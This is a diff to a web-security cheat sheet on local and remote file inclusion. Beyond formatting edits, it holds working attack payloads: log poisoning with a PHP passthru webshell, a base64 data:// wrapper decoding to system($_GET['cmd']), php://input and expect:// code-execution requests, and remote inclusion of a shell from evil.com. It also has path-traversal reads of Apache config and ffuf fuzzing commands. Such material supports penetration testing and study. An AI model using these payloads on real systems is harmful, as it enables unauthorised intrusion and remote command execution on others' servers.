@@ -51,19 +51,24 @@ curl -X "<?php echo passthru(\$_GET['cmd']);?>" http://localhost/wordpress/
 index.php?page=/var/log/apache2/access.log&cmd=id
 ```
 
-Access Log Location: Apache:
+Access Log Location
+
+Apache:
 
 * /var/log/apache/access.log
 * /var/log/apache2/access.log
-* /etc/httpd/logs/access\_log Nginx:
+* /etc/httpd/logs/access\_log&#x20;
+
+Nginx:
+
 * /var/log/nginx/access.log
 
 #### LFI to RCE
 
-```php
-
+{% code overflow="wrap" %}
+```bash
 # Data Wrappers
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+http://target.com/index.php?page=/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 
 # Input Wrappers
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target.com/index.php?page=php://input&cmd=id"
@@ -71,19 +76,23 @@ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target.com/index
 # Expect Wrappers
 curl -s "http://target.com/index.php?page=expect://id"
 ```
+{% endcode %}
 
 ### Remote File Inclusion (RFI)
 
 In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow\_url\_include setting to be enabled.
 
+{% code overflow="wrap" %}
 ```bash
-http://target.com/index.php?page=/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
+http://target.com/index.php?page=/index.php?page=ftp://user:pass@localhost/shell.php&cmd=id
 
 http://target.com/index.php?page=/index.php?language=http://evil.com/shell.php&cmd=id
 ```
+{% endcode %}
 
 ### Automation
 
+{% code overflow="wrap" %}
 ```bash
 # Fuzzing Parameter
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://target.com/index.php?FUZZ=value' -fs 2309
@@ -94,6 +103,7 @@ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http:
 # Read Apache2 Conf
 curl http://target.com/index.php?view=../../../../../../../../../../../../../../../../../../etc/apache2/apache2.conf
 ```
+{% endcode %}
 
 ### WordLists
 
